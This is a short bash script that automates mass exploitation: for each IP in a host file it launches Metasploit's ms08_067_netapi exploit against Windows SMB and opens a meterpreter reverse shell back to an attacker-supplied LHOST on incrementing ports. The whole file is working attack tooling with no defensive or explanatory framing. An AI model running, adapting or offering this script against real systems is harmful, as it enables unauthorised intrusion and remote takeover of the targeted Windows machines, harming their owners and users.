#!/bin/bash

if [ ! $1 ]; then echo "Usage: #./script <host file> <LHOST>"; exit; fi

iplist=$1
lhost=$2

i=4444
for ip in $(cat $iplist)
do
      gnome-terminal -x msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST $ip; set PAYLOAD windows/meterpreter/reverse_tcp;  set LHOST $lhost; set LPORT $i; run"
     echo "Exploiting $ip and establishing reverse connection on local port $i"
i=$(($i+1))
done

